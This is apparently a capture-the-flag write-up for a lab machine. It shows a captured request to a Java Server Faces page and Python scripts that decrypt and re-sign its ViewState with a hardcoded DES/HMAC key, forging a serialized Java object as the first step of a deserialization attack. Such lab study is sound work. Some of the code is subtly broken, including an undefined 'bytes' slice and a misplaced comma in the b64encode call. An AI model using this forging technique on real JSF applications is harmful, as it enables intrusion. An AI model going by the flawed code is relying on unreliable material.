
## Information Enumerarion

http://10.10.10.130:8080/userSubscribe.faces

![tCCe1A.png](https://s1.ax1x.com/2020/05/25/tCCe1A.png)

```
POST /userSubscribe.faces HTTP/1.1
Host: 10.10.10.130:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 265
Origin: http://10.10.10.130:8080
DNT: 1
Connection: close
Referer: http://10.10.10.130:8080/userSubscribe.faces
Cookie: JSESSIONID=E42A0E14305A3F886B37E69DCB4CACA6
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=mad%40qq.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXt
```

## Exploit

### Crack the image

```
from Crypto.Cipher import DES
mac = bytes[-20:]
enc = bytes[:-20]
HMAC.new(b'JsF9876-', enc, SHA).digest()
```

Decrypt 

```
from Crypto.Cipher import DES
d = DES.new(b'JsF9876-', DES.MODE_ECB)
d.decrypt(enc)
```


Encrypt script

```
from base64 import b64encode
from Crypto.Cipher import DES
from Crypto.HMAC import SHA, HMAC
from urllib.parse import quote_plus as urlencode

bin_vs = b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'

d = DES.new(b'JsF9876-', DES.MODE_ECB)
enc_payload = d.encrypt(bin_vs)
sig = HMAC.new(b'JsF9876-', enc_payload, SHA).digest()
gen_vs = urlencode(b64encode(enc_payload, + sig))
if gen_vs == vs:
    print("It worked!")
print(gen_vs)
print(vs)
```
